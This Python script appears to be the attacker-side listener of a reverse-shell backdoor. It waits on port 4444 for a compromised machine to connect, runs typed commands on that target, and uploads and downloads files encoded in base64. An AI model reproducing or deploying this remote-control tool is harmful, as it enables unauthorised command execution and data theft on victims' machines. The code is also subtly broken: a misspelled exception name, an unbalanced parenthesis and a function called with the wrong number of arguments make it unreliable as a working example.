#!/usr/bin/python

import socket, json, base64


class Listener:

	######
	#ip: IP Address of the machine
	#port: Port used to listen for connection.
	#Constructor method used to set up socket connection to target machine using passed IP Address and Port number
	#determined by the users machine.
	######
	def __init__(self, ip, port):

		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		# Connection drops then enable sockets to re-stablish connection
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		# Listen for incoming connection.
		listener.bind((ip, port))

		# Number of connections to be queued before we stop listening for connections.
		listener.listen(0)

		print("[+] Waiting for an incoming connection")

		# Accept connection and 
		self.connection, address = listener.accept()

	######
	# data: user command line input. 
	#Serialization implementation using JSON. Trasfer data between client and server. 
	######
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	#####
	# Method to unwrap received json data. 
	#####
	def reliable_receive(self):
		json_data = b""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValuError:
				continue

	######
	#command: command line argument
	#Method returns output from execution of command line argument on target machine.
	######
	def execute_remotely(self, command):
		self.reliable_send(command)

		if command[0] == "exit":
			self.connection.close()
			exit()

		return self.reliable_receive()

	#####
	#
	#####
	def read_file(self, path, content):
		with open(path, "rb") as file:
			return base64.b64encode(file.read()))

	######
	#
	######
	def write_file(self, path, content):
		with open(path, "wb") as file:
			# Decoding file from base64. Enables download of images (jpg, ...) and txt files (wrd, ...)
			file.write(base64.b64decode(content))
			return "[+] Download Successful."

	######
	#Execute method to send and receive data..
	######
	def run(self):
		while True:
			command = input(">> ")
			command = command.split(" ")
			
			try:
				if command[0] == "upload":
					# Open and read content of file. File list, [0] "upload", [1] file name.
					file_content = self.read_file(command[1])
					# Append the content of the file to the file list
					command.append(file_content)
			
				result = self.execute_remotely(command)
			
				if command[0] == "download" and "[-] Error " not in result:
					result = self.write_file(command[1] , result)
			except Exception:
				result = "[-] Error during cmd execution"
			
			print(result)


my_listener = Listener("XX.X.X.XX", 4444)
my_listener.run()
